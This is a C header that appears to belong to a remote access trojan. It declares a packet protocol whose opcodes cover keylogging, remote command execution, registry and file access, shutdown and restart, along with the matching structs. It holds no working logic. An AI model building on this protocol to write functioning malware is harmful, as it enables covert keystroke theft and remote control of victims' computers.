#pragma once

#include <stdint.h>

#define RAT_OPCODE_MAX_LEN 3 // max is 255 which is 3 bytes
#define DEFAULT_BUFLEN 64
#define DEFAULT_KEYLOG_BUFLEN 256

#define RAT_DATA_SIZE (DEFAULT_BUFLEN - sizeof(ratpacket_t))
#define RAT_KEYLOG_DATA_SIZE (DEFAULT_KEYLOG_BUFLEN - sizeof(ratpacket_t))

#define FOREACH_RAT_OPCODE                                                     \
  _(ECHO, 0, "Echo")                                                           \
  _(REGISTER_CLIENT, 1, "Register_client")                                     \
  _(UNREGISTER, 2, "Unregister")                                               \
  _(CONNECT_CLIENT, 3, "Connect_client")                                       \
  _(DISCONNECT, 4, "Disconnect")                                               \
  _(KEYLOG, 5, "Keylog")                                                       \
  _(TURN_OFF, 6, "Keylog_off")                                                 \
  _(TURN_ON, 7, "Keylog_on")                                                   \
  _(RESTART, 8, "Restart")                                                     \
  _(SHUTDOWN, 9, "Shutdown")                                                   \
  _(FILE, 10, "File")                                                          \
  _(REGISTRY, 11, "Registry")                                                  \
  _(CMD, 12, "Cmd")                                                            \
  _(ALERT, 13, "Alert")

typedef enum {
#define _(s, v, n) RAT_PACKET_##s = (v),
  FOREACH_RAT_OPCODE
#undef _
} op_codes;

char *rat_opcode_to_str(op_codes op);

typedef struct __attribute__((packed)) {
  uint8_t op;
  uint64_t data_len;
  uint8_t data[];
} ratpacket_t;

typedef struct {
  char *name;
  uint64_t content_len;
  uint8_t *content;
} entry_t;

typedef struct {
  char title[15];
  char text[35];
  int amount;
} alert_t;